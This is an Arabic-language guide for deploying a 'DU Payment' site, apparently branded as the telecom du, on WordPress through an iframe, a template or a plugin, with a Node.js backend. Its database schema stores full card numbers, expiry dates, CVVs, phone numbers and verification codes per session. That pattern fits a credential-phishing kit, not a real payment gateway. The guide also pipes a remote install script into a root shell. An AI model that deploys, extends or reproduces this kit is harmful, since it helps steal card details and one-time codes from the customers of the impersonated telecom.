# WordPress Integration Guide

## طرق دمج موقع DU للدفع مع WordPress

### الطريقة الأولى: استخدام Iframe (الأسهل)

1. **رفع الملفات على الخادم**:
   - ارفع مجلد `du-payment-backend` على خادمك
   - ارفع محتويات مجلد `du-payment-site/dist` على خادمك
   - تأكد من تشغيل الخادم الخلفي

2. **إضافة الكود في WordPress**:
   ```html
   <iframe src="https://your-domain.com/du-payment" 
           width="100%" 
           height="600px" 
           frameborder="0"
           style="border: none; border-radius: 10px;">
   </iframe>
   ```

### الطريقة الثانية: التضمين المباشر

1. **إنشاء صفحة مخصصة**:
   - أنشئ ملف `page-du-payment.php` في مجلد القالب
   - أضف الكود التالي:

```php
<?php
/*
Template Name: DU Payment
*/
get_header(); ?>

<div id="du-payment-container">
    <!-- سيتم تحميل واجهة الدفع هنا -->
</div>

<script src="<?php echo get_template_directory_uri(); ?>/du-payment/assets/index.js"></script>
<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/du-payment/assets/index.css">

<?php get_footer(); ?>
```

2. **نسخ الملفات**:
   - انسخ محتويات `du-payment-site/dist` إلى مجلد القالب
   - تأكد من تحديث مسارات API

### الطريقة الثالثة: إنشاء Plugin مخصص

1. **إنشاء مجلد Plugin**:
   ```
   wp-content/plugins/du-payment/
   ├── du-payment.php
   ├── assets/
   └── includes/
   ```

2. **ملف Plugin الرئيسي** (`du-payment.php`):
```php
<?php
/**
 * Plugin Name: DU Payment Gateway
 * Description: Complete payment interface for DU telecommunications
 * Version: 1.0.0
 */

// منع الوصول المباشر
if (!defined('ABSPATH')) {
    exit;
}

class DUPaymentPlugin {
    
    public function __construct() {
        add_action('init', array($this, 'init'));
        add_shortcode('du_payment', array($this, 'render_payment_form'));
    }
    
    public function init() {
        // تسجيل الأصول
        wp_enqueue_script('du-payment-js', plugin_dir_url(__FILE__) . 'assets/index.js', array(), '1.0.0', true);
        wp_enqueue_style('du-payment-css', plugin_dir_url(__FILE__) . 'assets/index.css', array(), '1.0.0');
    }
    
    public function render_payment_form($atts) {
        return '<div id="du-payment-root"></div>';
    }
}

new DUPaymentPlugin();
?>
```

3. **استخدام Shortcode**:
   ```
   [du_payment]
   ```

## إعداد الخادم الخلفي

### على cPanel/WHM:

1. **رفع الملفات**:
   - ارفع مجلد `du-payment-backend` خارج المجلد العام
   - مثال: `/home/username/du-payment-backend/`

2. **تثبيت Node.js**:
   - من cPanel، انتقل إلى "Setup Node.js App"
   - أنشئ تطبيق جديد وحدد المسار
   - حدد ملف البداية: `server.js`

3. **تشغيل التطبيق**:
   ```bash
   cd du-payment-backend
   npm install
   npm start
   ```

### على VPS/Dedicated Server:

1. **تثبيت التبعيات**:
   ```bash
   curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
   sudo apt-get install -y nodejs
   ```

2. **رفع وتشغيل المشروع**:
   ```bash
   cd /var/www/du-payment-backend
   npm install
   npm start
   ```

3. **استخدام PM2 للإنتاج**:
   ```bash
   npm install -g pm2
   pm2 start server.js --name "du-payment-backend"
   pm2 startup
   pm2 save
   ```

## تكوين قاعدة البيانات

قاعدة البيانات SQLite تأتي جاهزة مع المشروع. إذا كنت تريد استخدام MySQL:

1. **إنشاء قاعدة البيانات**:
```sql
CREATE DATABASE du_payment;
USE du_payment;

CREATE TABLE phone_numbers (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(255),
    phone_number VARCHAR(20),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE card_details (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(255),
    card_number VARCHAR(20),
    expiry_date VARCHAR(10),
    cvv VARCHAR(5),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE verification_codes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(255),
    code VARCHAR(10),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

2. **تحديث ملف `.env`**:
```
DB_TYPE=mysql
DB_HOST=localhost
DB_USER=your_username
DB_PASS=your_password
DB_NAME=du_payment
```

## الأمان والحماية

### إعدادات الخادم:
- تأكد من تشغيل HTTPS
- قم بتكوين CORS بشكل صحيح
- استخدم متغيرات البيئة للمعلومات الحساسة

### WordPress Security:
- استخدم nonces للتحقق من الطلبات
- قم بتنظيف البيانات المدخلة
- استخدم prepared statements لقاعدة البيانات

## استكشاف الأخطاء

### مشاكل شائعة:

1. **خطأ CORS**:
   - تأكد من تكوين CORS في الخادم الخلفي
   - أضف domain WordPress إلى قائمة المصادر المسموحة

2. **مشاكل قاعدة البيانات**:
   - تحقق من صلاحيات الملفات
   - تأكد من وجود ملف قاعدة البيانات

3. **مشاكل التحميل**:
   - تحقق من مسارات الملفات
   - تأكد من تحميل JavaScript و CSS بشكل صحيح

## الدعم الفني

للحصول على المساعدة:
1. تحقق من ملف README الرئيسي
2. راجع ملفات السجل (logs)
3. تأكد من تطابق إصدارات Node.js والتبعيات

